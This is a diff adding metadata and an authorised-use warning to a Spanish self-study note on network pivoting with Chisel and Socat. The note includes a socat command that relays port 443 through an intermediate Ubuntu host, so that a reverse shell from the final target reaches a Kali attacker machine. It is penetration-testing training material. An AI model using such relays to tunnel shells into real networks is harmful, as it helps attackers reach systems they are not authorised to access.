@@ -1,3 +1,15 @@
+---
+title: "Pivoting Básico Socat + Chisel"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Tendremos el siguiente escenario:
 ![[Pasted image 20240115131504.png]]
 Chisel es una herramienta de pivoting compatible tanto con máquinas Windows como Linux. Nos permite de forma muy cómoda prácticamente obtener las mismas funciones que SSH (en el aspecto de Port Forwarding).
@@ -26,3 +38,10 @@ Ahora, si queremos conseguir una reverse shell, tenemos que utilizar socat, ya q
 socat tcp-l:443,fork,reuseaddr tcp:192.168.0.30:443
 ```
 Y ahora ya podríamos efectuar cualquier ataque desde la máquina Kali y recibir la conexión desde la máquina final, pasando primero por el puerto 443 de la máquina ubuntu y luego enviando dicha conexión al puerto 443 de la máquina Kali.
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
